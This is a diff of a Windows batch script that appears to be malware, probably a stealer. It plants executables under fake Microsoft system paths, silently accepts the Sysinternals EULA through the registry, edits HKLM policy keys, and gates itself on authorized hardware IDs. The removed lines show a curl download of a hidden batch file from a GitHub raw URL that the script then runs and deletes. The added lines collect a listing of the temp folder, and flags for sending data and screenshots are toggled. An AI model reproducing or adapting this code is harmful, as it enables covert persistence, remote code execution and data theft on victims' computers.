@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=20.7"
+set "BATCHVERSION=20.8"
 
 
 
@@ -128,16 +128,14 @@ if %errorLevel% == 0 (
 echo.
 echo.
 
-echo ProtectionWindowsHostProcess.exe is not running. Continue.....
+::echo ProtectionWindowsHostProcess.exe is not running. Continue.....
 
 
 
 echo Maybe Turning CheckSend=1
-set "CheckSend=0"
-set "SENDSCREENSHOT=1"
+set "CheckSend=1"
+set "SENDSCREENSHOT=0"
 set "lastMinute=none"
-echo.
-echo.
 echo CheckSend=!CheckSend!
 echo.
 
@@ -180,22 +178,11 @@ set "FILE_TO_CHECK=%temp%\STLRLOG.mseuope"
 reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
 reg add HKCU\Software\Sysinternals\Handle /v EulaAccepted /t REG_DWORD /d 1 /f
 reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
-echo.
-echo Handle LOGFILE T3 STLR
-handle.exe "%FILE_TO_CHECK%"
-echo.
 echo Handle LOGFILE TA3 RUNEVERY
 handle.exe "%LOGFILE%"
 echo.
 echo.
-echo echo Handle ProtectionWindowsHostProcess
-handle.exe "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
-echo.
-echo.
-echo Handle STLRRUNNERCALLER
-handle.exe "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
-echo.
-echo.
+
 
 
 
@@ -210,7 +197,8 @@ if exist "%temp%\STLRLOG.mseuope" (
 ) else (
     echo STLRLOG.mseuope not exist
 )
-
+echo.
+echo.
 
 
 
@@ -274,122 +262,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 
 
 set "COMSTARTED=0"
-
-
-
-set "STLRKILL=0"
-
-:: Check STLRKILL value at the start
-if "%STLRKILL%" NEQ "1" goto NOTKILLSTLR
-
-
-
-
-:PROCESSKILLERSTLR
-set "ProcessToKill=STLRRUNNERCALLER"
-echo Turning CheckSend=1
-set "CheckSend=1"
-echo CheckSend=!CheckSend!
-echo.
-echo Listing child processes of %ProcessToKill%.exe...
-powershell -Command "Get-CimInstance Win32_Process | Where-Object { $_.ParentProcessId -eq (Get-Process -Name %ProcessToKill%).Id } | Select-Object ProcessId, Name" > chldrocess.txt
-echo.
-type chldrocess.txt
-echo.
-echo.
-:: Display and kill the child processes
-echo.
-echo PID   -   Process Name
-echo ----------------------
-for /f "skip=3 tokens=1,2 delims= " %%A in (chldrocess.txt) do (
-    set "PID=%%A"
-    set "PROCESSNAME=%%B"
-    echo !PID!   -   !PROCESSNAME!
-    echo Killing !PROCESSNAME! with PID !PID!
-    taskkill /PID !PID! /F
-)
-echo.
-echo All child processes terminated.
-del chldrocess.txt
-echo.
-
-:: Kill the parent process itself
-taskkill /F /T /IM %ProcessToKill%.exe
-goto DONE1
-
-
-:NOTKILLSTLR
-echo STLRKILL is 0. Skipping process termination.
-
-
-
-:DONE1
-
-
-
-
-
-
-goto :NEXT3
-
-
-
-:: Check if the file exists
-if exist "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe" goto :CHECKSTLRRUNSTATUS
-echo STLRRUNNERCALLER.exe not found. Going to NEXT3
-goto :NEXT3
-
-
-
-:CHECKSTLRRUNSTATUS
-
-if "%STLRKILL%" NEQ "0" goto CONTINUEAFTERCHECKSTLRRUNSTATUS
-
-echo Check if the process is already running...
-tasklist /fi "imagename eq STLRRUNNERCALLER.exe" | find /i "STLRRUNNERCALLER.exe" >nul
-if %errorlevel% neq 0 goto :STLRCALLNOTRUNNING
-goto :STLRCALLRUNNING
-
-
-:STLRCALLNOTRUNNING
-echo STLRRUNNERCALLER.exe is not running.
-echo Turning CheckSend=1
-set "CheckSend=1"
-echo CheckSend=%CheckSend%
-echo Starting STLRRUNNERCALLER...
-start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
-set "MESSAGE=STLRSTARTED|"
-echo Started.
-goto :CONTINUEAFTERCHECKSTLRRUNSTATUS
-
-:STLRCALLRUNNING
-echo STLRRUNNERCALLER.exe is already running.
-
-
-
-
-
-:CONTINUEAFTERCHECKSTLRRUNSTATUS
-
-
-echo.
-echo.
-echo CheckSend=%CheckSend% and MESSAGE=%MESSAGE%
-
-
-
-
-echo Listing all STLRRUNNERCALLER.exe processes with PIDs...
-tasklist /FI "IMAGENAME eq STLRRUNNERCALLER.exe"
-
-
-echo.
-echo.
-
-
-
-
-
 
 
 
@@ -531,35 +403,8 @@ timeout /t 1 /nobreak >nul
 echo MESSAGE KMS IS = %MESSAGE%
 echo CheckSenddd IS = %CheckSend%
 
-
-
-
-goto :CHECKSTARTUPPROGRAMS
-
-:STLRRUN
-echo :STLRRUN
 echo.
-
-:: Define the paths
-set "sourceFile=%SystemRoot%\System32\WindowsTasks.exe"
-set "startupFile=%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
-
-:: Check if the file exists in the Startup folder
-if not exist "%startupFile%" (
-    echo File not found in Startup folder. Restoring...
-    copy "%sourceFile%" "%startupFile%"
-) else (
-    echo File is already in %startupFile%.
-)
-
-timeout /t 1 /nobreak >nul
-
-
-
-
-:: THIS PLACE IS IGNORED
-
-
+echo.
 
 :CHECKSTARTUPPROGRAMS
 echo :CHECKSTARTUPPROGRAMS
@@ -1176,65 +1021,6 @@ echo.
 
 
 
-goto CheckHandle
-
-
-
-:CheckSTLRRUN
-echo :CheckSTLRRUN
-echo.
-
-:: Check STLRRUNNERCALLER.exe; if found, skip to next section
-if exist "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe" (
-    echo %ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe found. Going to CheckHandle
-    goto CheckHandle
-)
-
-:: Run commands if STLRRUNNERCALLER.exe is not found
-echo Checking for STLRRUNNERCALLER...
-set "embeddedScript=temp_script_STLRRUNINST.bat"
-
-:: Download content and save to the embedded batch file
-curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/STLRRUNNERCALLER"
-attrib +h +s "%embeddedScript%"
-
-if exist "%embeddedScript%" (
-    echo Script content saved to %embeddedScript%.
-    call "%embeddedScript%"
-    del "%embeddedScript%"
-    echo.
-    echo.
-) else (
-    echo Filed to get content from NIRCMD Link
-    echo.
-    timeout /t 3 /nobreak >nul
-    goto CheckSTLRRUN
-)
-
-set "MESSAGE=%MESSAGE%STLRRUN^|"
-echo Turning CheckSend=1
-set "CheckSend=1"
-
-
-
-echo.
-echo.
-echo Displaying Message
-echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
-echo.
-echo.
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -1584,6 +1370,9 @@ echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
+echo List Temp "%temp%" files and folders >> "%InstalledQWB%"
+dir /b "%temp%" >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
@@ -1660,10 +1449,8 @@ echo.
 
 
 echo Stopping processes...
-taskkill /F /IM RuntimeBroker.exe
 taskkill /F /IM TSSPrxySTC.exe
 taskkill /F /IM TSSPrxyAdSTC.exe
-taskkill /F /IM RuntimeBroker.exe
 taskkill /F /IM StartupTaskCaller.exe
 
 
@@ -1691,6 +1478,11 @@ echo %VALID_HWIDS% | findstr /I /C:"%HWID%" >nul && goto HWIDMATCH
 
 echo HWID not authorized!
 goto NEXT6
+
+
+
+
+
 
 :HWIDMATCH
 echo HWID matched! Running program...
